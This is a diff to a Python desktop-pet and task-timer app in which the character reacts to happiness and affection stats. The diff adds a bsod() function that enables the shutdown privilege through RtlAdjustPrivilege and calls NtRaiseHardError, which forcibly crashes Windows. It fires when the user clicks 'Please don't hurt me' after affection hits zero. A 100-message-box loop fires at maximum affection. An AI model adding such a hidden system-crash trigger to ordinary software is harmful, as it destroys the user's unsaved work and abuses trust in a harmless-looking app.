@@ -12,6 +12,12 @@ import os
 import bisect
 import threading as th
 import ctypes
+from ctypes import windll
+from ctypes import c_int
+from ctypes import c_uint
+from ctypes import c_ulong
+from ctypes import POINTER
+from ctypes import byref
 
 
 
@@ -28,6 +34,7 @@ init_sprite = r"./resources/init_sprite.png"
 happy_icon = r"./resources/happy_icon.png"
 sad_icon = r"./resources/sad_icon.png"
 affection_icon = r"./resources/heart_icon.png"
+min_affection_sprite = r"./resources/affection_min.png"
 popup_ame=r"./resources/pop_up_ame"
 popup_kangel=r"./resources/pop_up_kangel"
 complete_ame=r"./resources/task_complete_ame"
@@ -143,12 +150,6 @@ def main():
     #dev_console()
     
 
-
-
-
-
-
-
 #backend functions
 
 #initiate if no saved file
@@ -235,7 +236,7 @@ def create_task(name, time):
         if name in task["name"]:
             return("Enter another name")
     try:
-        time = int(time)
+        time = float(time)
     except ValueError:
         return("Enter a number")
     tasks.append({"name": name, "time": time})
@@ -257,6 +258,11 @@ def get_stat_update(stat_type, old, new):
     new_stage = bisect.bisect([1, 25, 50, 75, 100], new)
     if stat_type == "happiness":
         update_main(new_stage)
+    elif stat_type == "affection":
+        if new_stage == 5:
+            affection_event(5)
+        elif new_stage == 0:
+            affection_event(0)
     return [stat_type, old_stage, new_stage]
 
 def start_random_event(interval):
@@ -268,9 +274,7 @@ def random_event():
     global active_event
     while active_event:
         time.sleep(5)
-    active_event = True
-    ctypes.windll.user32.MessageBoxW(0, "Surprise!", "Random event", 1)
-    active_event = False
+    random_event_gui()
 
 def start_task_timer(name, time):
     global task_event_timer
@@ -282,14 +286,37 @@ def task_event(name):
     global active_event
     while active_event:
         time.sleep(5)
-    active_event = True
-    ctypes.windll.user32.MessageBoxW(0, f"Task: {name}", f"Time's up!", 1)
+    task_gui_event(name)
     task_event_timer.cancel()
-    active_event = False
     delete_task(name)
 
+def affection_event(stage):
+    if stage == 5:
+        i = 0
+        while i < 100:
+            ctypes.windll.user32.MessageBoxW(0, "I LOVE YOU <3 UWU", 1)
+            i += 1
+    if stage == 0:
+        affection_event_gui()
 
+def bsod():
+    nullptr = POINTER(c_int)()
 
+    windll.ntdll.RtlAdjustPrivilege(
+        c_uint(19), 
+        c_uint(1), 
+        c_uint(0), 
+        byref(c_int())
+    )
+
+    windll.ntdll.NtRaiseHardError(
+        c_ulong(0xC000007B), 
+        c_ulong(0), 
+        nullptr, 
+        nullptr, 
+        c_uint(6), 
+        byref(c_uint())
+    )
 
 
 
@@ -401,6 +428,7 @@ def complete_task():
         elif ame.happiness < 50:
             r = random.choice(os.listdir(complete_ame))
             main_sprite = ImageTk.PhotoImage(Image.open(os.path.join(complete_ame, r)).resize((522, 340)))
+
         main_dialogue_text = random.choice(diag_completed)
         main_dialogue_label.config(text = main_dialogue_text)
         main_sprite_display = tkinter.Label(main_frame, image = main_sprite)
@@ -440,8 +468,64 @@ def fail_task():
         for i in task_name_listbox.curselection():
             sel = task_name_listbox.get(i)
             delete_task(sel)
+    
+def task_gui_event(name):
+    global main_sprite
+    global active_event
+    task_frame.grid_forget()
+    task_entry_frame.grid_forget()
+    task_list_frame.grid_forget()
+    task_list_btn_frame.grid_forget()
+
+    if ame.happiness >= 50:
+            r = random.choice(os.listdir(popup_kangel))
+            main_sprite = ImageTk.PhotoImage(Image.open(os.path.join(popup_kangel, r)).resize((522, 340)))
+    elif ame.happiness < 50:
+            r = random.choice(os.listdir(popup_ame))
+            main_sprite = ImageTk.PhotoImage(Image.open(os.path.join(popup_ame, r)).resize((522, 340)))
+    
+    main_dialogue_text = random.choice(diag_asking) + f"\n Task name: {name}"
+    main_dialogue_label.config(text = main_dialogue_text)
+    main_sprite_display = tkinter.Label(main_frame, image = main_sprite)
+    main_sprite_display.grid(row=0, column=0)
+
+    event_frame.grid(row=3, column=0)
+    event_button_yes.grid(row=0, column=0)
+    event_button_no.grid(row=0, column=1)
+
+    active_event = True
+
+def random_event_gui():
+    global main_sprite
+    global active_event
+
+    task_frame.grid_forget()
+    task_entry_frame.grid_forget()
+    task_list_frame.grid_forget()
+    task_list_btn_frame.grid_forget()
+
+    if ame.happiness >= 50:
+            r = random.choice(os.listdir(popup_kangel))
+            main_sprite = ImageTk.PhotoImage(Image.open(os.path.join(popup_kangel, r)).resize((522, 340)))
+    elif ame.happiness < 50:
+            r = random.choice(os.listdir(popup_ame))
+            main_sprite = ImageTk.PhotoImage(Image.open(os.path.join(popup_ame, r)).resize((522, 340)))
+    main_dialogue_text = random.choice(diag_asking)
+
+    main_dialogue_text = random.choice(diag_questions)
+    main_dialogue_label.config(text = main_dialogue_text)
+    main_sprite_display = tkinter.Label(main_frame, image = main_sprite)
+    main_sprite_display.grid(row=0, column=0)
+
+    event_frame.grid(row=3, column=0)
+    event_button_yes.grid(row=0, column=0)
+    event_button_no.grid(row=0, column=1)
+
+    active_event = True
+
 
 def complete_event(status):
+    global active_event
     event_frame.grid_forget()
     if status == "complete":
         ame.happiness += 3
@@ -449,9 +533,33 @@ def complete_event(status):
         ame.happiness -= 3
     elif status == "yes":
         ame.affection += 5
+        stage = bisect.bisect([1, 25, 50, 75, 100], ame.happiness)
+        update_main(stage)
     elif status == "no":
         ame.affection -= 5
+        stage = bisect.bisect([1, 25, 50, 75, 100], ame.happiness)
+        update_main(stage)
+    elif status == "bsod":
+        bsod()
+    active_event = False
     init_task_elements()
+
+def affection_event_gui():
+    global main_sprite
+    task_frame.grid_forget()
+    task_entry_frame.grid_forget()
+    task_list_frame.grid_forget()
+    task_list_btn_frame.grid_forget()
+
+    main_dialogue_text = "How could you??? I'm done with you"
+    main_dialogue_label.config(text = main_dialogue_text)
+    main_sprite = ImageTk.PhotoImage((Image.open(min_affection_sprite).resize((522, 340))))
+    main_sprite_display = tkinter.Label(main_frame, image = main_sprite)
+    main_sprite_display.grid(row=0, column=0)
+
+    event_frame.grid(row=3, column=0)
+    event_button.config(text="Please don't hurt me", command= lambda: complete_event("bsod"))
+    event_button.grid(row=0, column=0)
 
     
 def init_console():
@@ -489,7 +597,6 @@ def submit_command():
                 start_random_event(600)
         if sel == "Stop random events":
             random_event_timer.cancel()
-
 
 #status bar
 stat_bar_frame = tkinter.Frame(tk_root)
@@ -529,7 +636,7 @@ task_fail_button = Button(task_list_btn_frame, text= "Fail", padx = 20, command=
 event_frame = tkinter.Frame(tk_root)
 event_button = Button(event_frame, text= "Submit", padx = 20, command= lambda: complete_event(""))
 event_button_yes = Button(event_frame, text= "Yes", padx = 20, command= lambda: complete_event("yes"))
-event_button_no = Button(event_frame, text= "Yes", padx = 20, command= lambda: complete_event("no"))
+event_button_no = Button(event_frame, text= "No", padx = 20, command= lambda: complete_event("no"))
 
 #dev console elements
 console_frame = tkinter.Frame(tk_root)
@@ -557,7 +664,3 @@ tk_root.after_idle(init)
 #init main(), put this last
 if __name__ == "__main__":
     main()
-
-
-
-# to do: task timer (technically done but not in gui, just alert box for now), random event, special event for stage 0 and 5
